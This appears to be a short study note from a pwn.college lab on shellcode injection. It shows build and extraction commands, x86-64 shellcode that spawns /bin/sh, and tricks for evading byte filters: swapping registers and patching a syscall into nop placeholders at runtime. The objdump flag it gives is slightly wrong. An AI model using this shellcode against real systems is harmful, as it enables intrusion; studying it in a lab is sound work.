---
date: 2024-01-28
topic: pwn.college - shellcode injection
tags: technical, shellcode, pwn.college, assembly, security, injection, low-level
---

# Brief

In [pwn.college](https://pwn.college/), I'm currently learning about [shellcode injection](https://pwn.college/program-security/shellcode-injection).

# What I Learned

## pwn.college - Shellcode Injection

* you can compile assembly code using `gcc -nostdlib -static <assembly_file> -o <object_file>`.
* then we can disassemble the object file using `objdump -d <object_file>`. you can specify the architecture using `-m <arch>` option. for example I'm using untel syntax, so I need to specify the architecture using `-m intel`.
* then to get the shellcode, we can use `objcopy` command: `objcopy --dump-section .text=<output_file> <object_file>`.
* to view the hexdump of the shellcode, we can use `hd <output_file>`.
* this is the example for executing `/bin/sh` using shellcode:

```asm
.global _start
_start:
.intel_syntax noprefix
    mov rax, 59
    lea rdi, [rip+binsh]
    mov rsi, 0
    mov rdx, 0
    syscall
binsh:
    .string "/bin/sh"
```

* using `mov *, rdi` or `mov *, rax` will generate opcode `48` which we want to avoid. using `lea` also didn't solve the problem. weirdly, using  registry `r8` or `r9` will not generate opcode `48`. so we can use `mov r8, rdi` and `mov rdi, r8` to avoid opcode `48`.
* we can write data to a pointer, specially `rip` so it will be executed later on when the program reaches that point. for example, to replace `syscall` which is translates to these 2 bytes: `0f 05`, we can use the following:

```asm
    mov byte ptr [rip + 7], 0x0f # 7 is the offset, because next instruction is 7 bytes long
    mov byte ptr [rip + 1], 0x05 # 1 is the offset, because next instruction is 1 bytes long
    nop # placeholder to be replaced
    nop # placeholder to be replaced
```

# Ideas to Explore in the Future

-
